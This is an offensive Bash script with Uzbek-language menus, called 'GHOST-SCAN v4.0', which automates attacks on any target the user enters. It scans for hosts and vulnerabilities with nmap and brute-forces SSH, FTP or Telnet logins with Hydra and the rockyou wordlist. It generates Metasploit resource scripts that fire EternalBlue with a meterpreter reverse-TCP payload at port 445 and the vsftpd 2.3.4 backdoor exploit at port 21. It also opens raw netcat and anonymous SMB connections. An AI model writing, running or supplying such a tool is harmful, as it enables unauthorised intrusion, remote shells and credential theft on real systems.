#!/bin/bash

# =====================================================================
# GHOST-SCAN v4.0: AI SMART PORT EXPLOITER & DYNAMIC CONNECTOR
# =====================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

check_requirements() {
    clear
    echo -e "${BLUE}[*] Tizim qurollari va ulanish paketlari tekshirilmoqda...${NC}"
    if ! command -v nmap &> /dev/null; then sudo apt install nmap -y; fi
    if ! command -v hydra &> /dev/null; then sudo apt install hydra -y; fi
    if ! command -v msfconsole &> /dev/null; then sudo apt install metasploit-framework -y; fi
    if ! command -v nbtscan &> /dev/null; then sudo apt install nbtscan -y; fi
    if ! command -v nc &> /dev/null; then sudo apt install netcat-traditional -y; fi
    if ! command -v telnet &> /dev/null; then sudo apt install telnet -y; fi
    if ! command -v ssh &> /dev/null; then sudo apt install openssh-client -y; fi
    if ! command -v ftp &> /dev/null; then sudo apt install ftp -y; fi
    if ! command -v curl &> /dev/null; then sudo apt install curl -y; fi
    if ! command -v smbclient &> /dev/null; then sudo apt install smbclient -y; fi
}

get_target() {
    echo -e "\n${CYAN}Nishonni kiriting (IP manzil, Tarmoq diapazoni yoki Sayt):${NC}"
    read -p "Target IP/Range/Domain: " TARGET
    if [ -z "$TARGET" ]; then TARGET="127.0.0.1"; fi
}
show_menu() {
    clear

    echo -e "${CYAN}"
    cat << 'EOF'

                    ╭────────────────╮
                    │    ◉  SCAN     │
                    ╰───────┬────────╯
                            │
                       ╭────▼────╮
                    ╭──┤   ╱│╲   ├──╮
                  ╭─┤  │  ╱ │ ╲  │  ├─╮
                 ╱  │  │────┼────│  |  ╲
                │   │  │  ╲ │ ╱  │  |   │
                │   │  │   ╲|╱   │  |   │
                 ╲  │  ╰────●────╯  |  ╱
                  ╰─┤     RADAR     ├─╯
                    ╰───────┬───────╯
                            │
              ┌─────────────┼─────────────┐
              │             │             │
           ┌──▼──┐       ┌──▼──┐       ┌──▼──┐
           │ 22  │       │ 80  │       │ 443 │
           │ SSH │       │HTTP │       │HTTPS│
           └─────┘       └─────┘       └─────┘

               ═══ G H O S T - S C A N ═══
                  PORT  ANALYZER  v4.0

EOF
    echo -e "${NC}"

    echo -e "${CYAN}====================================================${NC}"
    echo -e "${MAGENTA}          GHOST-SCAN v4.0: AI PORT ANALYZER${NC}"
    echo -e "${CYAN}====================================================${NC}"
    echo -e "Joriy nishon (Target): ${GREEN}${TARGET}${NC}"
    echo "----------------------------------------------------"

    echo -e "1)  ${YELLOW}Nishonni o'zgartirish (Yakka IP yoki Butun Tarmoq)${NC}"
    echo -e "2)  ${GREEN}WI-FI TARMOQDAGI BARCHA QURILMALARNI QIDIRISH${NC}"
    echo -e "3)  ${GREEN}Tezkor Skanerlash${NC} (Quick Port Scan)"
    echo -e "4)  ${CYAN}Dasturlar Versiyasi va OSni Aniqlash${NC}"
    echo -e "5)  ${RED}ZAIFLIKLARNI QIDIRISH (Nmap NSE Skriptlar - CVE)${NC}"
    echo -e "6)  ${MAGENTA}OCHIQ PORTLARNI TAHLIL QILISH${NC}"
    echo -e "7)  ${YELLOW}HYDRA - Parol xavfsizligini tekshirish${NC}"
    echo -e "8)  ${BLUE}🌐 SMART PORT CONNECTOR - Avtomatik Aniqlash${NC}"
    echo -e "9)  ${YELLOW}📖 PORT VA NETWORK QO'LLANMASI${NC}"
    echo -e "10) ${RED}Chiqish${NC}"

    echo -e "${CYAN}====================================================${NC}"

    read -p "Amalni tanlang [1-10]: " choice

    case "$choice" in
        1) get_target; show_menu ;;
        2) discover_hosts ;;
        3) quick_scan ;;
        4) advanced_detection ;;
        5) vuln_scan ;;
        6) run_metasploit ;;
        7) run_hydra ;;
        8) smart_connect_port ;;
        9) show_guide ;;
        10) exit 0 ;;
        *)
            echo -e "${RED}\nNoto'g'ri tanlov!${NC}"
            sleep 1
            show_menu
            ;;
    esac
}
discover_hosts() {
    echo -e "\n${GREEN}[*] Wi-Fi tarmoqdagi barcha faol qurilmalar qidirilmoqda...${NC}"
    sudo nmap -sn "$TARGET"
    sudo nbtscan -r "$TARGET" 2>/dev/null
    read -p "Menyoga qaytish uchun Enter bosing..." && show_menu
}

quick_scan() {
    echo -e "\n${GREEN}[*] Eng faol portlar tekshirilmoqda...${NC}"
    sudo nmap -F --open "$TARGET"
    read -p "Menyoga qaytish uchun Enter bosing..." && show_menu
}

advanced_detection() {
    echo -e "\n${CYAN}[*] Ochiq portlar ortidagi drayverlar aniqlanmoqda...${NC}"
    sudo nmap -sS -sV -O -T4 "$TARGET"
    read -p "Menyoga qaytish uchun Enter bosing..." && show_menu
}

vuln_scan() {
    echo -e "\n${RED}[!] Tizimdagi ma'lum zaifliklar (Exploits) tekshirilmoqda...${NC}"
    mkdir -p ~/Desktop/Scan_Results
    sudo nmap -sV --script=vuln "$TARGET" | tee ~/Desktop/Scan_Results/network_vuln.txt
    read -p "Menyoga qaytish uchun Enter bosing..." && show_menu
}

run_metasploit() {
    echo -e "\n${MAGENTA}====== METASPLOIT AUTOMATED PORT EXPLOITER ======${NC}"
    read -p "Ochiq port raqamini kiriting (445, 21, 80): " open_port
    read -p "Nishonning yakka IP manzilini kiriting: " single_ip
    
    case $open_port in
        445)
            echo -e "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS $single_ip\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit" > /tmp/msf_script.rc
            ;;
        21)
            echo -e "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS $single_ip\nexploit" > /tmp/msf_script.rc
            ;;
        *)
            echo -e "use auxiliary/scanner/portscan/tcp\nset RHOSTS $single_ip\nrun" > /tmp/msf_script.rc
            ;;
    esac
    sudo msfconsole -r /tmp/msf_script.rc
    read -p "Menyoga qaytish uchun Enter bosing..." && show_menu
}

run_hydra() {
    echo -e "\n${YELLOW}====== HYDRA CRACKER ======${NC}"
    read -p "Protokol (ssh, ftp, telnet): " protocol
    read -p "Login (admin, root): " login_name
    read -p "Wordlist (Bo'sh bo'lsa standart): " wordlist
    if [ -z "$wordlist" ]; then wordlist="/usr/share/wordlists/rockyou.txt"; fi
    sudo hydra -l "$login_name" -P "$wordlist" "$TARGET" "$protocol" -V -f
    read -p "Menyoga qaytish uchun Enter bosing..." && show_menu
}

smart_connect_port() {
    clear
    echo -e "\n${BLUE}========================================================${NC}"
    echo -e "${YELLOW}       🔌 GHOST-CONNECTOR: AQLLI AVTOMATIK ULANISH      ${NC}"
    echo -e "${BLUE}========================================================${NC}"
    echo -e "Nishon qurilma: ${GREEN}$TARGET${NC}"
    echo -e "${CYAN}[*] Qurilmadagi jonli ochiq portlar ro'yxati...${NC}"
    echo -e "--------------------------------------------------------"
    
    # Faqat ochiq portlarni chiroyli ko'rsatish
    sudo nmap -F --open "$TARGET" | grep -E "PORT|open"
    
    echo -e "--------------------------------------------------------"
    echo -e "${YELLOW}[?] Yuqoridagi ochiq chiqqan portlardan birini yozing.${NC}"
    read -p "Ulanmoqchi bo'lgan PORT raqami (Orqaga qaytish uchun '0'): " CHOSEN_PORT
    
    if [ "$CHOSEN_PORT" -eq 0 ] 2>/dev/null; then
        show_menu
    fi
    
    echo -e "--------------------------------------------------------"
    echo -e "${BLUE}[*] Port $CHOSEN_PORT tahlil qilinmoqda va ulanish moslashtirilmoqda...${NC}"
    
    # Kiritilgan port raqamiga qarab avtomatik to'g'ri dasturni tanlash
    case $CHOSEN_PORT in
        22) # SSH
            read -p "SSH foydalanuvchi nomi (User - masalan: root): " user
            ssh "${user}@${TARGET}"
            ;;
        23) # Telnet
            echo -e "${GREEN}[*] Telnet orqali konsol ochilmoqda...${NC}"
            telnet "$TARGET" 23
            ;;
        21) # FTP
            echo -e "${GREEN}[*] FTP fayl tizimiga kirilmoqda...${NC}"
            ftp -p "$TARGET"
            ;;
        80|443|8443) # Web sayt portlari
            echo -e "${GREEN}[*] Ushbu port Veb-sayt paneli ekan. Skanerlab index matni olinmoqda...${NC}"
            curl -I -k "https://$TARGET:$CHOSEN_PORT" 2>/dev/null || curl -I "http://$TARGET:$CHOSEN_PORT"
            echo -e "${YELLOW}\n[!] Maslahat: Ushbu portni ochish uchun Firefox brauzeriga kirib manzilga http://$TARGET:$CHOSEN_PORT deb yozing.${NC}"
            ;;
        139|445) # SMB/Samba Shared Folders
            echo -e "${GREEN}[*] SMB ochiq papkalari va ulashilgan drayverlar ro'yxati olinmoqda...${NC}"
            smbclient -L "//$TARGET" -N
            ;;
        *) # Boshqa noma'lum har qanday port uchun Netcat universal ulanishi
            echo -e "${YELLOW}[*] Noma'lum port. Netcat (NC) orqali xom ulanish sinab ko'rilmoqda...${NC}"
            nc -nv "$TARGET" "$CHOSEN_PORT"
            ;;
    esac
    
    echo -e "--------------------------------------------------------"
    read -p "Ulanish seansi yakunlandi. Menyoga qaytish uchun Enter bosing..." && show_menu
}

show_guide() {
    clear
    echo -e "${YELLOW}========================================================================${NC}"
    echo -e "             📖 MUKAMMAL AI EXPLOIT VA ULANISH QO'LLANMASI             "
    echo -e "${YELLOW}========================================================================${NC}"
    echo -e "${GREEN}1. AQLLI PORT CONNECTOR (8-modul):${NC}"
    echo -e "   - Endi siz menyu tanlab o'tirmaysiz. Skript portlarni ko'rsatadi va raqam so'raydi."
    echo -e "   - 21 yozsangiz -> FTP dasturini ochadi."
    echo -e "   - 22 yozsangiz -> SSH ulanishini boshlaydi."
    echo -e "   - 23 yozsangiz -> Telnet konsolini ishga tushiradi."
    echo -e "   - 80 yoki 443 yozsangiz -> Sayt sarlavhalarini (Headers) o'qib, brauzerda ochishni o'rgatadi."
    echo -e "   - 445 yozsangiz -> Tarmoqdagi yopiq va ochiq umumiy papkalarni qidiradi."
    echo -e "   - Istalgan boshqa portni yozsangiz -> Netcat orqali universal ulanadi."
    echo -e "========================================================================${NC}"
    read -p "Asosiy menyuga qaytish uchun Enter bosing..." && show_menu
}

# Skriptni boshlash
check_requirements
get_target
show_menu
